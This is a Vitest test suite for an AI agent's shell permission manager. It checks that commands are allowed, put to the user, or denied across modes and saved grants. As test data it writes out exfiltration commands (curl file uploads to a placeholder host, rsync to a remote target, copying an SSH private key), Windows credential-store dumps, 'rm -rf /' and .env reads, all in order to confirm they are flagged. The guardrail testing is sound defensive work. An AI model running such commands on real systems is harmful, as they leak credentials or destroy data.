import "../../__tests__/support/trusted-powershell.js";
import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
import { aveHome } from "../../shared/ave-home.js";
import { PermissionManager, type PermissionRule } from "../permission-manager.js";
import { canonicalizePathForMatch, SENSITIVE_PATH_ENTRIES } from "../sensitive-paths.js";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
import { shellExfiltrationSignal, shellSensitivePathSignal } from "../rules/literal-shell-inspection.js";
import { analyzeShellForRules, evaluateShellRules } from "../rules/shell-rule-matcher.js";
import { parseRuleSpecifier } from "../rules/rule-specifier.js";
import { SHELL_PREFIX_POLICY, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
import { buildShellRuleApproval } from "../rules/shell-rule-approval.js";
import { modelShellPath } from "../../shared/shell-native-path.js";
import { RUNNER_DECISIONS, RUNNER_POLICY_CASES, RUNNER_SECURITY_CASES } from "./fixtures/runner-decisions.js";

// Startup pinning is a host fact; cover both states instead of inheriting it (win32 is never pinned).
const startup = vi.hoisted(() => ({ pinned: true }));
vi.mock("../../shared/powershell-startup-policy.js", async (importOriginal) => ({ ...await importOriginal<typeof import("../../shared/powershell-startup-policy.js")>(), isPowerShellStartupPinned: () => startup.pinned }));

const CWD = process.platform === "win32" ? resolve("/work/project").replaceAll("\\", "/") : "/work/project";
const DIALECTS = ["bash", "powershell"] as const;
const RUNNER_NAMES = ["npx", "bunx", "pnpx", "uvx", "pipx", "corepack", "yarnpkg", "deno", "npm", "pnpm", "yarn", "bun"];
type ShellDialect = typeof DIALECTS[number];
const ALL_DECISION_CASES = RUNNER_DECISIONS.flatMap((row) => {
  const cases = DIALECTS.map((dialect) => ({
    command: row.command,
    dialect,
    ...(row.dialects?.[dialect] ?? { bucket: row.bucket, why: row.why }),
  }));
  // A static invocation prefix preserves the declared dialect expectation.
  if (!row.command.trimStart().startsWith("&")) cases.push({
    command: `& ${row.command}`,
    dialect: "powershell",
    ...(row.dialects?.powershell ?? { bucket: row.bucket, why: row.why }),
  });
  return cases;
});
const DECISION_CASES = [...new Map(ALL_DECISION_CASES.map((row) => [`${row.dialect}\0${row.command}`, row] as const)).values()];
let directory: string;
let accountDirectory: string;
let managerSequence = 0;
beforeAll(async () => {
  directory = mkdtempSync(join(tmpdir(), "ave-runner-decisions-"));
  accountDirectory = join(directory, "accounts");
  mkdirSync(accountDirectory);
  accountDirectory = realpathSync.native(accountDirectory).replaceAll("\\", "/");
  // These cases classify command text, so application roots only supply path identities. Prepare them once instead of rediscovering missing ancestors for every scalar. They stay immutable until the run-home teardown; the persistence cases below write their own files outside this fixture.
  const home = aveHome();
  const applicationRoots = SENSITIVE_PATH_ENTRIES.filter((entry) => entry.anchor === "ave-home")
    .map((entry) => ({ entry, path: join(home, ...entry.segments) }));
  const canonicalRoots = applicationRoots.map(({ path }) => canonicalizePathForMatch(path));
  for (const { entry, path } of applicationRoots) {
    if (entry.kind === "dir") mkdirSync(path, { recursive: true, mode: 0o700 });
    else {
      mkdirSync(dirname(path), { recursive: true, mode: 0o700 });
      writeFileSync(path, path.endsWith(".json") ? "{}\n" : "", { flag: "wx", mode: 0o600 });
    }
  }
  expect(applicationRoots.map(({ path }) => canonicalizePathForMatch(path))).toEqual(canonicalRoots);
});
afterAll(() => { rmSync(directory, { recursive: true, force: true }); });

function runnerManager(permissionsPath = join(directory, `${managerSequence++}.json`)): PermissionManager {
  const manager = new PermissionManager(permissionsPath);
  manager.setMode("strict");
  return manager;
}

function actionKey(dialect: ShellDialect, command: string, cwd = CWD): string {
  return `shell-action:${createHash("sha256").update(JSON.stringify([dialect, command, cwd])).digest("hex")}`;
}

function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string, runsSandboxed = false, headless = false, cwd = CWD) {
  // Absolute credential suffixes do not depend on the host's account lookup. Keep native drive syntax intact on platforms without the account mount.
  const source = process.platform === "win32"
    ? command
    : command.replaceAll("/home/u/", `${accountDirectory}/u/`);
  return manager.checkDetailed(dialect, "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect, command: source, cwd },
    shellExecution: { runsSandboxed },
    approvalCacheKey: actionKey(dialect, command, cwd),
    headless,
  });
}

function expectOrdinaryHostAsk(result: ReturnType<typeof checkCommand>): void {
  expect(result).toMatchObject({ decision: "ask" });
  expect(result.forceModal).not.toBe(true);
}

function shellRule(prefix: string) {
  const pattern = `Bash(${prefix} *)`;
  const spec = parseRuleSpecifier(pattern);
  if (spec.kind !== "bash") throw new Error("Expected shell rule");
  return { pattern, spec };
}

const RULE_CASES: { argv: string[]; prefix: string; incomplete: string; proof: "unproven" | "static-complete" | "literal-evaluation" }[] = [
  { argv: ["npx", "helper", "--future"], prefix: "npx helper", incomplete: "npx", proof: "unproven" },
  { argv: ["npx", "node", "script.js"], prefix: "npx node", incomplete: "npx", proof: "unproven" },
  { argv: ["bunx", "helper", "--future"], prefix: "bunx helper", incomplete: "bunx", proof: "unproven" },
  { argv: ["pnpx", "helper", "--future"], prefix: "pnpx helper", incomplete: "pnpx", proof: "unproven" },
  { argv: ["uvx", "helper", "--future"], prefix: "uvx helper", incomplete: "uvx", proof: "unproven" },
  { argv: ["pipx", "run", "helper", "--future"], prefix: "pipx run helper", incomplete: "pipx run", proof: "unproven" },
  { argv: ["yarn", "dlx", "helper", "--future"], prefix: "yarn dlx helper", incomplete: "yarn dlx", proof: "unproven" },
  { argv: ["yarn", "node", "script.js"], prefix: "yarn node script.js", incomplete: "yarn node", proof: "unproven" },
  { argv: ["yarnpkg", "exec", "helper", "--future"], prefix: "yarnpkg exec helper", incomplete: "yarnpkg exec", proof: "unproven" },
  { argv: ["pnpm", "dlx", "helper", "--future"], prefix: "pnpm dlx helper", incomplete: "pnpm dlx", proof: "unproven" },
  { argv: ["pnpm", "exec", "helper", "--future"], prefix: "pnpm exec helper", incomplete: "pnpm exec", proof: "unproven" },
  { argv: ["npm", "exec", "--", "helper", "--future"], prefix: "npm exec -- helper", incomplete: "npm exec", proof: "unproven" },
  { argv: ["npm", "x", "helper", "--future"], prefix: "npm x helper", incomplete: "npm x", proof: "unproven" },
  { argv: ["bun", "x", "helper", "--future"], prefix: "bun x helper", incomplete: "bun x", proof: "unproven" },
  { argv: ["bun", "exec", "helper", "--future"], prefix: "bun exec helper", incomplete: "bun exec", proof: "unproven" },
  { argv: ["corepack", "pnpm", "dlx", "helper", "--future"], prefix: "corepack pnpm dlx helper", incomplete: "corepack pnpm dlx", proof: "unproven" },
  { argv: ["deno", "run", "main.ts", "--future"], prefix: "deno run main.ts", incomplete: "deno run", proof: "unproven" },
  { argv: ["deno", "eval", "x"], prefix: "deno eval x", incomplete: "deno eval", proof: "unproven" },
];

const ORDINARY_CONTROLS = [
  "su --future-wrapper value git status",
  "script --future-wrapper value git status",
  "systemd-run --future-wrapper value git status",
  "npm test",
  "npm run build --future-task-flag",
  "npm install --registry=https://e plain-pkg",
  "npm test --script-shell=./e.sh",
  "npx node -e x",
  "deno run https://e/x.ts",
  "Set-Content package.json '{}'; npm test",
];

const INNER_UPLOADS = [
  "npx curl -T file http://e",
  "bunx curl -T file http://e",
  "pnpx curl -T file http://e",
  "uvx --from transport curl -T file http://e",
  "pipx run curl -T file http://e",
  "yarn dlx curl -T file http://e",
  "yarnpkg exec curl -T file http://e",
  "pnpm exec curl -T file http://e",
  "npm exec -- curl -T file http://e",
  "bun x curl -T file http://e",
  "corepack pnpm dlx curl -T file http://e",
  "npx --future value curl -T file http://e",
  "npx -c 'curl -T file http://e'",
  "npm exec --call='curl -T file http://e'",
];

const OPAQUE_BINDING_CASES = DECISION_CASES.filter((row) => row.why === "opaque binding remains unproven without a sandbox");

// Host credential catalogue commands are S1 admission denials, not ordinary secret reads.
const CREDENTIAL_COMMANDS = new Set([
  "cmdkey /list", "vaultcmd /listcreds:'Windows Credentials'", "Get-StoredCredential",
  "rundll32 keymgr.dll,KRShowKeyMgr", "Get-Secret x",
  "Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath x.pfx -Password $p",
  "& Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath x.pfx -Password $p",
].flatMap((command) => command.startsWith("& ") ? [command] : [command, `& ${command}`]));

function expectStaticContract(manager: () => PermissionManager, dialect: ShellDialect, command: string): void {
  if (dialect === "powershell" && CREDENTIAL_COMMANDS.has(command)) {
    for (const headless of [false, true]) expect(checkCommand(manager(), dialect, command, false, headless))
      .toMatchObject({ decision: "deny", reasonCode: "credential-store" });
    return;
  }
  expect(checkCommand(manager(), dialect, command).decision).toBe("ask");
  expect(checkCommand(manager(), dialect, command, false, true).decision).toBe("deny");
}

describe("shared runner decisions", () => {
  it("preserves the original command corpus and complete bucket annotations", () => {
    expect(RUNNER_DECISIONS).toHaveLength(2031);
    const commands = RUNNER_DECISIONS.map((row) => row.command);
    expect(createHash("sha256").update(JSON.stringify(commands.slice(0, 1377))).digest("hex"))
      .toBe("0bb43140a7a4776182bff6c0104625d09f3efca09719cc09f5e15549e2e41bf9");
    // The complete command identity was collected independently of this table.
    expect(new Set(commands).size).toBe(RUNNER_DECISIONS.length);
    expect(createHash("sha256").update(JSON.stringify([...commands].sort())).digest("hex"))
      .toBe("b8db143d8567f666b649b2b10b3ad37d565dbd49657c485982e0e27c55b84273");
    for (const dialect of DIALECTS) {
      const expectations = RUNNER_DECISIONS.map((row) => row.dialects?.[dialect] ?? row);
      const counts = dialect === "bash"
        ? { floor: 288, ordinary: 1655, normal: 88 }
        : { floor: 317, ordinary: 1615, normal: 99 };
      for (const bucket of ["floor", "ordinary", "normal"] as const) {
        expect(expectations.filter((row) => row.bucket === bucket)).toHaveLength(counts[bucket]);
      }
      for (const row of expectations) expect(row.why.length).toBeGreaterThan(0);
    }
    expect(DECISION_CASES.some((row) => /^\s*&\s*&/.test(row.command))).toBe(false);
    const buckets = new Map(DECISION_CASES.map((row) => [`${row.dialect}\0${row.command}`, row.bucket] as const));
    for (const row of ALL_DECISION_CASES) expect(buckets.get(`${row.dialect}\0${row.command}`)).toBe(row.bucket);
  });

  it.each(DECISION_CASES)("applies Default mode to the preserved corpus in $dialect: $command ($why)", (row) => {
    const { command, dialect } = row;
    // Historical buckets describe analysis coverage. Default mode independently requires a card for host shells.
    expectStaticContract(runnerManager, dialect, command);
  });

  it.each(RUNNER_SECURITY_CASES)("retains reviewed security disposition in Allow with saved grants: $dialect $command", async (row) => {
    const platform = "platforms" in row && process.platform === "win32" ? row.platforms.win32 : undefined;
    const { dialect, command } = row;
    const disposition = platform?.disposition ?? row.disposition;
    const reasonCode = platform?.reasonCode ?? row.disposition;
    const manager = runnerManager();
    manager.setMode("allow");
    if (disposition === "exfiltration") {
      const unconsented = checkCommand(manager, dialect, command);
      expect(unconsented).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
      expect(unconsented.forceModal).toBeUndefined();
      expect(unconsented.pipelineRequest?.floor).toBeUndefined();
      expect(unconsented.pipelineRequest?.exfiltration?.reason).toEqual(expect.any(String));
      expect(checkCommand(manager, dialect, command, false, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
    }
    if (disposition === "project-escape") {
      const unconsented = checkCommand(manager, dialect, command);
      expect(unconsented).toMatchObject({ decision: "ask", forceModal: true, reasonCode: platform?.reasonCode ?? "project-escape",
        pipelineRequest: { floor: { code: "project-escape" } } });
      expect(unconsented.reviewer).toBeUndefined();
      if (platform?.exfiltration === false) expect(unconsented.pipelineRequest?.exfiltration).toBeUndefined();
      else expect(unconsented.pipelineRequest?.exfiltration?.reason).toEqual(expect.any(String));
      expect(checkCommand(manager, dialect, command, false, true)).toMatchObject({
        decision: "deny", reasonCode: "no-approver", reason: "Nobody can approve this request; do not retry.",
      });
    }
    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
    manager.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
    if (disposition === "ordinary") {
      expect(dialect === "bash" ? shellExfiltrationSignal(command, CWD) : inspectPowerShellCommand(command, CWD).exfiltration).toBeNull();
      expect(checkCommand(manager, dialect, command).decision).toBe("allow");
      expect(checkCommand(manager, dialect, command, false, true).decision).toBe("allow");
      return;
    }
    if (disposition === "exfiltration") {
      for (const headless of [false, true]) {
        const consented = checkCommand(manager, dialect, command, false, headless);
        expect(consented).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
        expect(consented.forceModal).toBeUndefined();
      }
      return;
    }
    const consented = checkCommand(manager, dialect, command);
    expect(consented).toMatchObject(disposition === "credential-store"
      ? { decision: "deny", reasonCode }
      : { decision: "ask", forceModal: true, reasonCode });
    if (platform?.exfiltration === false) expect(consented.pipelineRequest?.exfiltration).toBeUndefined();
    const headless = checkCommand(manager, dialect, command, false, true);
    expect(headless.decision).toBe("deny");
    if (platform) expect(headless.reasonCode).toBe("no-approver");
  });

  it.runIf(process.platform === "win32").each(["C:/work/project", "D:/work/project"])("retains the saved-grant backslash operand disposition with cwd %s", async (cwd) => {
    const cwdProbe = process.platform === "win32" ? vi.spyOn(process, "cwd").mockReturnValue(cwd) : undefined;
    try {
      if (process.platform === "win32") {
        expect(modelShellPath("\\es", { dialect: "bash", location: cwd }).nativePath).toBe(resolve("/es"));
      }
      const row = RUNNER_SECURITY_CASES.find((entry) => entry.dialect === "bash" && entry.command.startsWith("Copy-Item ~/.ssh/id_rsa "))!;
      const manager = runnerManager();
      manager.setMode("allow");
      await manager.addAlwaysAllowedPersist(actionKey(row.dialect, row.command, cwd));
      manager.setRules(([{ pattern: actionKey(row.dialect, row.command, cwd), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
      for (const headless of [false, true]) {
        expect(checkCommand(manager, row.dialect, row.command, false, headless, cwd)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
      }
    } finally {
      cwdProbe?.mockRestore();
    }
  });

  it.each(DIALECTS)("keeps a backslash root delete forced in %s", (dialect) => {
    const manager = runnerManager();
    manager.setMode("allow");
    expect(checkCommand(manager, dialect, "rm -rf \\")).toMatchObject({ decision: "ask", reasonCode: "critical-delete", forceModal: true });
    expect(checkCommand(manager, dialect, "rm -rf \\", false, true).decision).toBe("deny");
  });

  it.each(DIALECTS)("keeps a slash root delete forced in %s", (dialect) => {
    const manager = runnerManager();
    manager.setMode("allow");
    const reasonCode = process.platform === "win32" ? (dialect === "bash" ? "protected-path" : "critical-delete") : "critical-delete";
    expect(checkCommand(manager, dialect, "rm -rf /")).toMatchObject({ decision: "ask", reasonCode, forceModal: true });
    expect(checkCommand(manager, dialect, "rm -rf /", false, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
  });

  it("keeps an unresolved write forced despite a saved grant", async () => {
    const command = 'echo ready > "$UNRESOLVED_TARGET"';
    const manager = runnerManager();
    manager.setMode("allow");
    await manager.addAlwaysAllowedPersist(actionKey("bash", command));
    expect(checkCommand(manager, "bash", command)).toMatchObject({
      decision: "ask", reasonCode: "protected-path", forceModal: true,
      pipelineRequest: { floor: { code: "protected-path" } },
    });
    expect(checkCommand(manager, "bash", command, false, true).decision).toBe("deny");
  });

  it("resolves a present-drive write to ordinary under a saved grant", async () => {
    const command = "echo ready > /c/x";
    const manager = runnerManager();
    manager.setMode("allow");
    await manager.addAlwaysAllowedPersist(actionKey("bash", command));
    manager.setRules(([{ pattern: actionKey("bash", command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
    expect(checkCommand(manager, "bash", command).decision).toBe("allow");
    expect(checkCommand(manager, "bash", command, false, true).decision).toBe("allow");
  });

  // The MSYS shell-root namespace has no native drive, so a drive-less absolute write is unresolvable on win32 regardless of which volumes exist.
  it.runIf(process.platform === "win32")("keeps an unresolved shell-root write forced despite a saved grant", async () => {
    const command = "echo ready > /logs/result";
    const manager = runnerManager();
    manager.setMode("allow");
    await manager.addAlwaysAllowedPersist(actionKey("bash", command));
    expect(checkCommand(manager, "bash", command)).toMatchObject({
      decision: "ask", reasonCode: "protected-path", forceModal: true,
      pipelineRequest: { floor: { code: "protected-path" } },
    });
    expect(checkCommand(manager, "bash", command, false, true).decision).toBe("deny");
  });

  it("retains background uncertainty without hiding subsequent literal effects", () => {
    const command = "Get-Date & Get-Date";
    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ outcome: "unproven", exfiltration: null });
    const manager = runnerManager();
    manager.setMode("auto");
    expect(checkCommand(manager, "powershell", command, true)).toMatchObject({ decision: "ask", reasonCode: "review-required" });
  });

  it.each(RUNNER_POLICY_CASES)("applies the declared host mode matrix: $command", ({ command, kind, outcomes }) => {
    for (const dialect of DIALECTS) {
      for (const [index, mode] of (["strict", "default", "auto", "allow"] as const).entries()) {
        const manager = runnerManager();
        manager.setMode(mode);
        for (const headless of [false, true]) {
          const result = checkCommand(manager, dialect, command, false, headless);
          const expected = outcomes[index];
          if (kind === "exfiltration" && headless) {
            expect(result).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
            expect(result.reviewer).toBeUndefined();
            expect(result.forceModal).toBeUndefined();
          } else if (expected === "forced") {
            expect(result).toMatchObject(headless ? { decision: "deny", reasonCode: "no-approver" }
              : { decision: "ask", forceModal: true, reasonCode: kind });
          } else if (expected === "reviewer") {
            expect(result).toMatchObject({ decision: "ask", reasonCode: "review-required" });
            expect(result.reviewer).toBeDefined();
          } else {
            expect(result.decision).toBe(headless && expected === "ask" ? "deny" : expected);
            expect(result.forceModal).not.toBe(true);
          }
        }
        if (kind !== "ordinary") {
          manager.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
          if (kind === "exfiltration") {
            for (const headless of [false, true]) {
              const result = checkCommand(manager, dialect, command, false, headless);
              expect(result).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
              expect(result.forceModal).toBeUndefined();
            }
          } else {
            expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: kind });
            expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
          }
        }
      }
    }
  });

  it.each(DIALECTS)("keeps proven sandbox reads automatic but opaque runners mode-dependent in %s", (dialect) => {
    for (const mode of ["strict", "default", "auto", "allow"] as const) {
      const manager = runnerManager();
      manager.setMode(mode);
      expect(checkCommand(manager, dialect, "echo ready", true).decision).toBe("allow");
      const opaque = checkCommand(manager, dialect, "npm test", true);
      expect(opaque.decision).toBe(mode === "allow" ? "allow" : "ask");
      expect(opaque.forceModal).not.toBe(true);
      if (mode === "auto") expect(opaque).toMatchObject({ reasonCode: "review-required" });
    }
  });

  it("keeps actual host credential admission ahead of modes and remembered rules", async () => {
    const command = `cat '${join(aveHome(), "keys", "encryption.key")}'`;
    for (const dialect of DIALECTS) {
      for (const mode of ["strict", "default", "auto", "allow"] as const) {
        const manager = runnerManager();
        manager.setMode(mode);
        await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
        for (const headless of [false, true]) expect(checkCommand(manager, dialect, command, false, headless))
          .toMatchObject({ decision: "deny", reasonCode: "credential-store" });
      }
    }
  });

  it.each(DIALECTS)("permits an ordinary exact host rule while deny takes precedence in %s", async (dialect) => {
    const command = "echo ready";
    const manager = runnerManager();
    const pattern = dialect === "bash" ? `Bash(${command})` : `PowerShell(${command})`;
    await manager.addRulePersist({ pattern, action: "allow" }, { kind: "user" });
    expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
    await manager.addRulePersist({ pattern, action: "deny" }, { kind: "user" });
    expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "deny", reasonCode: "rule-deny" });
  });

  it("keeps runner identities separate from transparent wrappers", () => {
    expect(SHELL_PREFIX_POLICY.packageRunners).toEqual(expect.arrayContaining(RUNNER_NAMES));
    for (const name of RUNNER_NAMES) {
      expect(SHELL_PREFIX_POLICY.wrappers).not.toContain(name);
      expect(wrapperPrefixLength([name, "helper"])).toBe(0);
    }
  });

  it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix, proof }) => {
    const command = argv.join(" ");
    const allowProven = proof === "static-complete";
    const exactEligible = proof !== "unproven";
    const shape = analyzeShellForRules(command);
    expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [] });
    if (shape.ok) {
      expect(shape.commands).toHaveLength(1);
      expect(shape.commands[0]).toMatchObject({ argv, allowBlockers: [] });
    }
    expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe(allowProven ? "allow" : null);
    expect(evaluateShellRules(command, { allow: [shellRule("helper")], deny: [], ask: [] }).decision).toBeNull();
    expect(evaluateShellRules(command, { allow: [], deny: [shellRule(prefix)], ask: [] }).decision).toBe("deny");
    expect(evaluateShellRules(command, { allow: [], deny: [], ask: [shellRule(prefix)] }).decision).toBe("ask");
    const manager = runnerManager();
    expectOrdinaryHostAsk(checkCommand(manager, "bash", command));
    // Prefix and exact rules still require reusable literal proof; mode routing is independent.
    await manager.addRulePersist({ pattern: shellRule(prefix).pattern, action: "allow" }, { kind: "user" });
    expectOrdinaryHostAsk(checkCommand(manager, "bash", command));
    await manager.addRulePersist({ pattern: `Bash(${command})`, action: "allow" }, { kind: "user" });
    if (exactEligible) expect(checkCommand(manager, "bash", command)).toMatchObject({ decision: "allow" });
    else expectOrdinaryHostAsk(checkCommand(manager, "bash", command));
    expect(buildShellRuleApproval("bash", command, CWD, { allow: true, deny: true }).exactRule).toBe(exactEligible ? `Bash(${command})` : null);
    expectOrdinaryHostAsk(checkCommand(manager, "powershell", command));
  });

  it.each(["env", "nice", "nohup", "command", "timeout 1"])
  ("keeps an unknown wrapped option unproven through %s", (wrapper) => {
    const command = `${wrapper} npm test --future`;
    for (const dialect of DIALECTS) expectOrdinaryHostAsk(checkCommand(runnerManager(), dialect, command));
  });

  it.each(ORDINARY_CONTROLS.flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))))
  ("reuses an exact-action approval for ordinary host $dialect: $command", async ({ command, dialect }) => {
    const savedPath = join(directory, `saved-${managerSequence++}.json`);
    const saved = runnerManager(savedPath);
    expectOrdinaryHostAsk(checkCommand(saved, dialect, command));
    await saved.addAlwaysAllowedPersist(actionKey(dialect, command));
    expect(checkCommand(saved, dialect, command)).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
    const reloaded = runnerManager(savedPath);
    await reloaded.loadRulesFromFile();
    expect(checkCommand(reloaded, dialect, command).decision).toBe("allow");
    const ruled = runnerManager();
    ruled.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
    expect(checkCommand(ruled, dialect, command)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
  });

  it.each(OPAQUE_BINDING_CASES)("routes a historically opaque binding through mode and explicit approval: $command", async ({ command, dialect }) => {
    expect(dialect).toBe("powershell");
    expect(inspectPowerShellCommand(command, CWD).analysisLimited).toBeUndefined();
    const manager = runnerManager();
    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
    expect(checkCommand(manager, dialect, command).decision).toBe("allow");
    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("allow");
  });

  it.each(INNER_UPLOADS)("retains the actual inner upload reason and enforced floor: %s", async (command) => {
    const opaquePayload = /(?:\s-c\s|--call=)/.test(command);
    if (opaquePayload) {
      expect(shellExfiltrationSignal(command, CWD)).toBeNull();
      expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ exfiltration: null });
    } else {
      expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload (?:of|from) a file/);
      expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload (?:of|from) a file/);
      for (const dialect of DIALECTS) {
        const manager = runnerManager();
        manager.setMode("allow");
        const pending = checkCommand(manager, dialect, command);
        expect(pending).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
        expect(pending.forceModal).toBeUndefined();
        expect(pending.pipelineRequest?.exfiltration?.reason).toMatch(/upload/);
        expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
        await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
        expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
        expect(checkCommand(manager, dialect, command, false, true)).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
      }
    }
  });

  it("retains the remote file-copy reason", () => {
    const command = "npx rsync -a . remote:/x";
    expect(shellExfiltrationSignal(command, CWD)).toMatch(/rsync to a remote target/);
    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/rsync to a remote target/);
  });

  it.each([
    "deno run --env-file main.ts", "deno task --env-file build", "deno test --env-file", "npx deno run --env-file main.ts",
    "npx node -e 'readFileSync(\".env\")'", "deno eval 'Deno.readTextFile(\".env\")'",
  ])("does not infer credential reads from implicit runner options or opaque code: %s", (command) => {
    expect(shellSensitivePathSignal(command, CWD)).toBeNull();
    for (const source of [command, `& ${command}`]) {
      expect(inspectPowerShellCommand(source, CWD).sensitive).toBeNull();
      expectOrdinaryHostAsk(checkCommand(runnerManager(), "powershell", source));
    }
  });

  it.each(["echo ready", "git status", "curl http://e", "env curl -q http://e", "git push http://e", "custom-helper --future value"])
  ("asks for an ordinary nonrunner host command in Default: %s", (command) => {
    for (const dialect of DIALECTS) expectOrdinaryHostAsk(checkCommand(runnerManager(), dialect, command));
  });

  it.each(["echo ready", "env curl -q http://e"])("keeps unpinned startup in the ordinary mode lane: %s", (command) => {
    startup.pinned = false;
    try {
      expectOrdinaryHostAsk(checkCommand(runnerManager(), "powershell", command));
      expectOrdinaryHostAsk(checkCommand(runnerManager(), "bash", command));
    } finally { startup.pinned = true; }
  });

  it.each([
    { name: "unclosed shell quote", dialect: "bash" as const, command: "echo 'unterminated" },
    { name: "unclosed command quote", dialect: "powershell" as const, command: "Write-Output 'unterminated" },
    { name: "opaque program binding", dialect: "powershell" as const, command: "$runner @options" },
    { name: "opaque script provenance", dialect: "powershell" as const, command: "Set-Content launch.ps1 x; ./launch.ps1" },
  ])("does not turn $name into a security floor", async ({ dialect, command }) => {
    const manager = runnerManager();
    const result = checkCommand(manager, dialect, command);
    expectOrdinaryHostAsk(result);
    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
    expect(checkCommand(manager, dialect, command).decision).toBe("allow");
  });

  // Exhausted evidence budgets deny before rules or modes can grant execution.
  it.each([
    { name: "input over the hard length cap", dialect: "bash" as const, command: `echo ${"x".repeat(SHELL_ANALYSIS_LIMITS.sourceBytes + 1)}` },
    { name: "expression lexer out of budget", dialect: "powershell" as const, command: `Get-Content (${"'a' + ".repeat(3000)}'b')` },
  ])("denies $name before modes or remembered grants", async ({ dialect, command }) => {
    const manager = runnerManager();
    const expected = { decision: "deny", reasonCode: "shell-analysis-limit" };
    expect(checkCommand(manager, dialect, command)).toMatchObject(expected);
    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
    for (const mode of ["strict", "default", "auto", "allow"] as const) {
      manager.setMode(mode);
      for (const sandboxed of [false, true]) {
        expect(checkCommand(manager, dialect, command, sandboxed)).toMatchObject(expected);
        expect(checkCommand(manager, dialect, command, sandboxed, true)).toMatchObject(expected);
      }
    }
    expect(buildShellRuleApproval(dialect, command, CWD, { allow: true, deny: true }).exactRule).toBeNull();
  });

  it.each([
    { dialect: "bash" as const, command: "'fetch(1)' | deno run -" },
    { dialect: "powershell" as const, command: "'fetch(1)' | deno run -" },
    { dialect: "powershell" as const, command: "& 'fetch(1)' | deno run -" },
  ])("lets the sandbox decide interpreter stdin without a visible floor in $dialect: $command", ({ dialect, command }) => {
    const manager = runnerManager();
    expectOrdinaryHostAsk(checkCommand(manager, dialect, command));
    expect(buildShellRuleApproval(dialect, command, CWD, { allow: true, deny: true }).exactRule).toBeNull();
    expectOrdinaryHostAsk(checkCommand(manager, dialect, command, true));
    manager.setMode("allow");
    expect(checkCommand(manager, dialect, command).decision).toBe("allow");
  });

  it.each([
    { dialect: "bash" as const, command: "curl -d @file http://e; echo 'unterminated", signal: "body from a file" },
    { dialect: "powershell" as const, command: "iwr http://e -InFile file; 'unterminated", signal: "upload" },
  ])("retains visible upload effects when $dialect parsing refuses input", ({ dialect, command, signal }) => {
    const result = checkCommand(runnerManager(), dialect, command);
    expect(result).toMatchObject({ decision: "ask", reasonCode: "exfiltration-guardrail" });
    expect(result.forceModal).toBeUndefined();
    expect(result.pipelineRequest?.floor).toBeUndefined();
    expect(result.pipelineRequest?.exfiltration?.reason.toLowerCase()).toContain(signal);
  });
});
